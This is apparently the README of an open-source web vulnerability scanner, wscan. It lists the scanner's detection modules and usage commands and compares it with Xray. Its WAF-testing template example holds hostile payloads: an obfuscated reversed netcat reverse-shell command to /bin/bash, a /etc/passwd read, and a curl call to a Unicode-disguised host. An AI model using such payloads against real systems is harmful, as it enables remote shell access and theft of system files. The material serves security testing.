[**中文**](README_CN.md)
# wscan
Wscan is a web security scanner that focuses on WEB security. It pays homage to Nmap, which has been open source for 25 years. We also plan to continuously update and keep Wscan open source for the next 25 years. We welcome anyone interested in web security to join our development team.

Our goal is to develop a tool for penetration testing using machine learning. Unlike other tools, our tool can automatically learn attack and defense patterns and launch personalized attacks based on specific targets. This way, our attack efficiency and accuracy will be significantly improved, while also reducing the probability of false positives.

Our tool employs machine learning technology to achieve fully automated web penetration testing. This means there is no need for manual addition and update of rules and signatures; it can automatically learn and adapt to new attack patterns and vulnerabilities.

Machine learning technology can also quickly process large amounts of data and traffic, thereby greatly improving testing efficiency and accuracy. In addition, it can identify and discover vulnerabilities and weaknesses that are difficult for humans to perceive, thus enhancing testing quality and reliability.

We believe that using machine learning technology for penetration testing will be a crucial direction for the future of network security. We hope that our tool can help more people safeguard network security and contribute to the field of network security.
![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/9f9e48711df62c154bde487c989dd3a9.gif)

# Detection Module

|       Detection Module       | Wscan | Xray | illustrate                                                                                                                                                 |
|--------------|-------|-----|------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `Dynamic Crawler Support`     | √               | ×              | Supports dynamic crawling for JavaScript-rendered web content         |
| `Static Crawler Support`       | √               | √              | Supports crawling of static HTML web content                          |
| `MITM-based Passive Scanning`     | √               | √             | Monitors and analyzes traffic passively via MITM (Man-in-the-Middle) |
| `xss`        |   √    |   √ | Detect XSS vulnerabilities using semantic analysis                                                                                                         |
| `sqldet`     |   √    |    Partial support  | Support for header injection, path injection, error injection, boolean injection, and time blind injection, etc.                                              |                                                                           |
| `cmd-injection` |      √ |   √ | Support shell command injection, PHP code execution, template injection, etc.                                                                              |
| `dirscan`    |    √   |   √ | Detect more than 10 sensitive paths and files such as backup files, temporary files, debug pages, configuration files, and so on                           |
| `path-traversal` |     √  |   √ | Supports common platforms and encodings                                                                                                                    |
| `xxe`        |    √   |    √ | Support for echo and anti-connection platform detection                                                                                                    |
| `upload`     |     √  |    √ | Support common backend languages                                                                                                                           |
| `brute-force` |     √  |    √ | The community edition supports detecting HTTP basic authentication and simple form weak passwords, with built-in common username and password dictionaries |
| `jsonp`      |    √   |  √  | Detecting the jsonp interface that contains sensitive information that can be read across domains                                                          |
| `ssrf`       |    √   |   √ | SSRF detection module, supporting common bypass techniques and anti-connection platform detection                                                          |
| `baseline`   |    √   |  √  | Detect low SSL versions, missing or incorrectly added HTTP headers, and more                                                                               |
| `redirect`   |   √    |  √  | Support HTML meta redirect, 30x redirect, etc.                                                                                                             |
| `crlf-injection` |     √  | √   | Detect HTTP header injection, support query, body and other parameters                                                                                     |
| `xstream`    |     √  |√    | Detect XStream series vulnerabilities                                                                                                                      |
| `struts`     |    √   | √   | Detect whether the target website has Struts2 series vulnerabilities, including common vulnerabilities such as s2-016, s2-032, s2-045, s2-059, and s2-061. |
| `thinkphp`   |  √     | √   | Detecting vulnerabilities in websites developed using ThinkPHP                                                                                             |
| `shiro`      |    √    |   √ | Detecting Shiro deserialization vulnerabilities                                                                                                            |
| `fastjson`   |  √     |  √  | Detect fastjson vulnerability                                                                                                                              |
| `Nuclei YAML POC` |    √    |  ×   | Nuclei standard POC detection plugin                                                                                                                       |
| `Xray YAML POC` |     √     | √      | POC detection plugin for Xray standard                                                                                                                     |
| `Goby JSON POC` |     √       |     ×    | Gody standard POC detection plugin                                                                                                                         |
| `WAF bypass detection`    |     √         |  ×         | Customize various special payloads to test whether Waf can intercept them                                                                                  |
| `WEB Component Identification` | √               | ×              | Identifies components and related technologies in web applications    |
| `JavaScript Sensitive Content Detection`| √         | ×              | Detects sensitive content in JavaScript, such as AK/SK, API keys, phone numbers, emails, etc. |

# Example Usage 
⬇️[Download Link](https://github.com/chushuai/wscan/releases) [🏠BestPractices](https://github.com/chushuai/wscan/blob/main/doc/BestPractices.md)
```
(1) Active Scan
./wscan  --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/ --json-output=wscan_scan_result.json --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --browser  http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1  --json-output=wscan_scan_result.json
./wscan  --log-level=debug ws --url-file=/wscan/url_file.txt --html-output=wscan_scan_result.html
./wscan  --log-level=debug ws --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html

(2) Passive Scan
./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  

(3）POC Scan
    3.1 POC download address https://github.com/chushuai/wscan-poc/releases
    3.2 When Wscan is first run, a file named config.yaml will be generated. You need to modify the following content in this file to specify the path of include_poc.
        prometheus:
            enabled: true
            depth: 1
            auto_load_poc: false
            include_poc:
                - C:\wscan_windows_amd64.exe\wscan-poc-1.0.0\pocs\*.yml
            exclude_poc: [] 
    3.3 Enable --plug=prometheus via command line, and specify the absolute path of --url-file (one URL per line) to conduct large-scale POC detection.
        ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
(4) Custom web general vulnerability scanning template (Waf bypass/Waf testing)
    4.1 Unlike POC testing, the custom web general vulnerability scanning plugin will perform FUZZ on the parameters at the specified location.
        Sample reference https://github.com/chushuai/wscan/tree/main/core/plugins/custom_tmpl/tmpl/owasp
        Plugin sample
        ---
        payload:
          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
          - /etc/passwd
          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
        encoder:
          - URL
        placeholder:
          - URLParam
          - HTMLForm
          - HTMLMultipartForm
          - JSONRequest
        type: "RCE"
        ...
    4.2 You need to modify the following content in the config.yaml file to specify the path of include_tmpl.
        enabled: true
        depth: 0
        auto_load_tmpl: false 
        include_tmpl:
          - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
        exclude_tmpl: [ ]
        block_status_codes: # When blocked by WAF, the HTTP status code list, default value is 403
          - 403
        pass_status_codes: # When not blocked by WAF, the HTTP status code list, default value is 200 or 404
          - 200
          - 404
        block_regex: "" # Regular expression for web pages blocked by WAF
        pass_regex: "" # Regular expression for web pages not blocked by WAF
        non_blocked_as_passed: false
    4.3 Enable --plug=custom_tmpl via command line to conduct custom Payload testing on the target website.
        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
(5) Independent deployment of anti-connection module
./wscan  reverse
```


# The open-source schedule is outlined as follows  
Wscan's goal is to create an open-source and non-profit project. However, due to the substantial workload involved in Wscan,
the code is still undergoing rapid iterations. Premature open-sourcing may lead to the emergence of various modified versions, 
which is not conducive to the tool's dissemination and the future development of the project. 
Therefore, the plan is to open-source the project in stages and modules, using Stars as a metric, 
to ensure the robustness of the project and organized community participation.

1.  YAML POC Scan Module (Open source when Stars > 400)  
2.  Reverse Connection Module (Open source when Stars > 400)  
3.  SQL Injection Module (Open source when Stars > 500)  
4.  Dynamic Crawler (Open source when Stars > 600)  
5.  Directory Scan Module (Open source when Stars > 700)  
6.  Baseline Scan (Open source when Stars > 800)  
7.  Plugin Scheduling Module Based on Message Subscription (Open source when Stars > 900)  
8.  HTTP Parameter Deformation Module; Traditional Scan Modules All Open Source; Users can modify, compile, and build scanners on their own (Open source when Stars > 1k)  
9.  Machine Learning Module to Reduce False Positives (Open source when Stars > 3k)  
10. Machine Learning Module for Automatic Payload Generation (Open source when Stars > 4k)  

# Star History

[![Star History Chart](https://api.star-history.com/svg?repos=chushuai/wscan,chaitin/xray,projectdiscovery/nuclei&type=Date)](https://star-history.com/#chushuai/wscan&chaitin/xray&projectdiscovery/nuclei&Date)